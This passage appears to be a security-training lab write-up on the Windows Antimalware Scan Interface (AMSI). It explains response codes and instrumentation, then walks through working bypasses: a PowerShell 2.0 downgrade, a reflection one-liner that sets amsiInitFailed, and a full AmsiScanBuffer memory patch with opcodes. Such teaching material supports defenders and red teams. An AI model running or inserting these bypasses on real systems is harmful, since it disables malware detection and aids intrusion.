## Table of Contents



Windows API calls and interacting with .NET. The [CLR (**C**ommon **L**anguage **R**untime)](https://docs.microsoft.com/en-us/dotnet/standard/clr) and [DLR (**D**ynamic **L**anguage **R**untime)](https://docs.microsoft.com/en-us/dotnet/framework/reflection-and-codedom/dynamic-language-runtime-overview)

AMSI will determine its actions from a response code as a result of monitoring and scanning. Below is a list of possible response codes,

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/8a5a7c3e04fb1ccf3e5391ce397c50a6.png)

- AMSI_RESULT_CLEAN = 0
- AMSI_RESULT_NOT_DETECTED = 1
- AMSI_RESULT_BLOCKED_BY_ADMIN_START = 16384
- AMSI_RESULT_BLOCKED_BY_ADMIN_END = 20479
- AMSI_RESULT_DETECTED = 32768

AMSI is instrumented from `System.Management.Automation.dll`, a .NET assembly developed by Windows; From the Microsoft docs, "Assemblies form the fundamental units of deployment, version control, reuse, activation scoping, and security permissions for .NET-based applications." The .NET assembly will instrument other DLLs and API calls depending on the interpreter and whether it is on disk or memory. The below diagram depicts how data is dissected as it flows through the layers and what DLLs/API calls are being instrumented.

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/35e16d45ce27145fcdf231fdb8dcb35e.png)  

In the above graph data will begin flowing dependent on the interpreter used (PowerShell/VBScript/etc.)  Various API calls and interfaces will be instrumented as the data flows down the model at each layer. It is important to understand the complete model of AMSI, but we can break it down into core components, shown in the diagram below. 

![](https://tryhackme-images.s3.amazonaws.com/user-uploads/5e73cca6ec4fcf1309f2df86/room-content/efca9438e858f0476a4ffd777c36501a.png)  

Note: AMSI is only instrumented when loaded from memory when executed from the CLR. It is assumed that if on disk MsMpEng.exe (Windows Defender) is already being instrumented.

Most of our research and known bypasses are placed in the Win32 API layer, manipulating the [AmsiScanBuffer](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nf-amsi-amsiscanbuffer) API call.

You may also notice the "Other Applications" interface from AMSI. Third-parties such as AV providers can instrument AMSI from their products. Microsoft documents [AMSI functions](https://docs.microsoft.com/en-us/windows/win32/amsi/antimalware-scan-interface-functions) and the [AMSI stream interface](https://docs.microsoft.com/en-us/windows/win32/api/amsi/nn-amsi-iamsistream)

We can break down the code for AMSI PowerShell instrumentation to better understand how it is implemented and checks for suspicious content. To find where AMSI is instrumented, we can use [InsecurePowerShell](https://github.com/PowerShell/PowerShell/compare/master...cobbr:master) maintained by [Cobbr](https://github.com/cobbr). InsecurePowerShell is a GitHub fork of PowerShell with security features removed; this means we can look through the compared commits and observe any security features. AMSI is only instrumented in twelve lines of code under `src/System.Management.Automation/engine/runtime/CompiledScriptBlock.cs`. These twelve lines are shown below.
```cpp
var scriptExtent = scriptBlockAst.Extent;
 if (AmsiUtils.ScanContent(scriptExtent.Text, scriptExtent.File) == AmsiUtils.AmsiNativeMethods.AMSI_RESULT.AMSI_RESULT_DETECTED)
 {
  var parseError = new ParseError(scriptExtent, "ScriptContainedMaliciousContent", ParserStrings.ScriptContainedMaliciousContent);
  throw new ParseException(new[] { parseError });
 }

 if (ScriptBlock.CheckSuspiciousContent(scriptBlockAst) != null)
 {
  HasSuspiciousContent = true;
 }
```

The PowerShell downgrade attack is a very low-hanging fruit that allows attackers to modify the current PowerShell version to remove security features.  

Most PowerShell sessions will start with the most recent PowerShell engine, but attackers can manually change the version with a one-liner. By "downgrading" the PowerShell version to 2.0, you bypass security features since they were not implemented until version 5.0.

The attack only requires a one-liner to execute in our session. We can launch a new PowerShell process with the flags `-Version` to specify the version (2).

```powershell
PowerShell -Version 2
```

This attack can actively be seen exploited in tools such as [Unicorn](https://github.com/trustedsec/unicorn).

```powershell
full_attack = '''powershell /w 1 /C "sv {0} -;sv {1} ec;sv {2} ((gv {3}).value.toString()+(gv {4}).value.toString());powershell (gv {5}).value.toString() (\\''''.format(ran1, ran2, ran3, ran1, ran2, ran3) + haha_av + ")" + '"'
```

Since this attack is such low-hanging fruit and simple in technique, there are a plethora of ways for the blue team to detect and mitigate this attack.

The two easiest mitigations are removing the PowerShell 2.0 engine from the device and denying access to PowerShell 2.0 via application blocklisting.

Reflection allows a user or administrator to access and interact with .NET assemblies. From the Microsoft docs, "Assemblies form the fundamental units of deployment, version control, reuse, activation scoping, and security permissions for .NET-based applications." .NET assemblies may seem foreign; however, we can make them more familiar by knowing they take shape in familiar formats such as exe (**exe**cutable) and dll (**d**ynamic-**l**ink **l**ibrary).

PowerShell reflection can be abused to modify and identify information from valuable DLLs.

The AMSI utilities for PowerShell are stored in the `AMSIUtils` .NET assembly located in `System.Management.Automation.AmsiUtils`.

Matt Graeber published a one-liner to accomplish the goal of using Reflection to modify and bypass the AMSI utility. This one-line can be seen in the code block below.

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

To explain the code functionality, we will break it down into smaller sections.
First, the snippet will call the reflection function and specify it wants to use an assembly from `[Ref.Assembly]` it will then obtain the type of the AMSI utility using `GetType`.

```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
```

The information collected from the previous section will be forwarded to the next function to obtain a specified field within the assembly using `GetField`.

```powershell
.GetField('amsiInitFailed','NonPublic,Static')
```

The assembly and field information will then be forwarded to the next parameter to set the value from `$false` to `$true` using `SetValue`.

```powershell
.SetValue($null,$true)
dir```

Once the `amsiInitFailed` field is set to `$true`, AMSI will respond with the response code: AMSI_RESULT_NOT_DETECTED = 1

AMSI is primarily instrumented and loaded from `amsi.dll`; this can be confirmed from the diagram we observed earlier. This dll can be abused and forced to point to a response code we want. The `AmsiScanBuffer` function provides us the hooks and functionality we need to access the pointer/buffer for the response code.

`AmsiScanBuffer` is vulnerable because `amsi.dll` is loaded into the PowerShell process at startup; our session has the same permission level as the utility.

`AmsiScanBuffer` will scan a "[buffer](https://en.wikipedia.org/wiki/Data_buffer)" of suspected code and report it to `amsi.dll` to determine the response. We can control this function and overwrite the buffer with a clean return code. To identify the buffer needed for the return code, we need to do some reverse engineering; luckily, this research and reverse engineering have already been done. We have the exact return code we need to obtain a clean response!

We will break down a code snippet modified by BC-Security and inspired by Tal Liberman; you can find the original code [here](https://github.com/BC-SECURITY/Empire/blob/master/empire/server/common/bypasses.py). RastaMouse also has a similar bypass written in C# that uses the same technique; you can find the code [here](https://github.com/rasta-mouse/AmsiScanBufferBypass).
At a high-level AMSI patching can be broken up into four steps,

1. Obtain handle of `amsi.dll`
2. Get process address of `AmsiScanBuffer`
3. Modify memory protections of `AmsiScanBuffer`
4. Write opcodes to `AmsiScanBuffer`

We first need to load in any external libraries or API calls we want to utilize; we will load [GetProcAddress](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getprocaddress), [GetModuleHandle](https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-getmodulehandlea), and [VirtualProtect](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect) from **kernel32** using [p/invoke](https://docs.microsoft.com/en-us/dotnet/standard/native-interop/pinvoke).

```csharp
[DllImport(`"kernel32`")] // Import DLL where API call is stored
public static extern IntPtr GetProcAddress( // API Call to import
	IntPtr hModule, // Handle to DLL module
	string procName // function or variable to obtain
);

[DllImport(`"kernel32`")]
public static extern IntPtr GetModuleHandle(
	string lpModuleName // Module to obtain handle
);

[DllImport(`"kernel32`")]
public static extern bool VirtualProtect(
	IntPtr lpAddress, // Address of region to modify
	UIntPtr dwSize, // Size of region
	uint flNewProtect, // Memory protection options
	out uint lpflOldProtect // Pointer to store previous protection options
); 
```

The functions are now defined, but we need to load the API calls using `Add-Type`. This cmdlet will load the functions with a proper type and namespace that will allow the functions to be called.

```powershell
$Kernel32 = Add-Type -MemberDefinition $MethodDefinition -Name 'Kernel32' -NameSpace 'Win32' -PassThru;
```

Now that we can call our API functions, we can identify where `amsi.dll` is located and how to get to the function. First, we need to identify the process handle of AMSI using `GetModuleHandle`. The handle will then be used to identify the process address of `AmsiScanBuffer` using `GetProcAddress`.

```csharp
$handle = [Win32.Kernel32]::GetModuleHandle(
	'amsi.dll' // Obtains handle to amsi.dll
);
[IntPtr]$BufferAddress = [Win32.Kernel32]::GetProcAddress(
	$handle, // Handle of amsi.dll
	'AmsiScanBuffer' // API call to obtain
); 
```

Next, we need to modify the memory protection of the `AmsiScanBuffer` process region. We can specify parameters and the buffer address for `VirtualProtect`.

Information on the parameters and their values can be found from the previously mentioned API documentation.

```csharp
[UInt32]$Size = 0x5; // Size of region
[UInt32]$ProtectFlag = 0x40; // PAGE_EXECUTE_READWRITE
[UInt32]$OldProtectFlag = 0; // Arbitrary value to store options
[Win32.Kernel32]::VirtualProtect(
	$BufferAddress, // Point to AmsiScanBuffer
	$Size, // Size of region
	$ProtectFlag, // Enables R or RW access to region
	[Ref]$OldProtectFlag // Pointer to store old options
);
```

We need to specify what we want to overwrite the buffer with; the process to identify this buffer can be found [here](https://rastamouse.me/memory-patching-amsi-bypass/). Once the buffer is specified, we can use [marshal copy](https://docs.microsoft.com/en-us/dotnet/api/system.runtime.interopservices.marshal.copy?view=net-6.0) to write to the process.

```csharp
$buf = [Byte[]]([UInt32]0xB8,[UInt32]0x57, [UInt32]0x00, [Uint32]0x07, [Uint32]0x80, [Uint32]0xC3);

[system.runtime.interopservices.marshal]::copy(
	$buf, // Opcodes/array to write
	0, // Where to start copying in source array 
	$BufferAddress, // Where to write (AsmiScanBuffer)
	6 // Number of elements/opcodes to write
);
```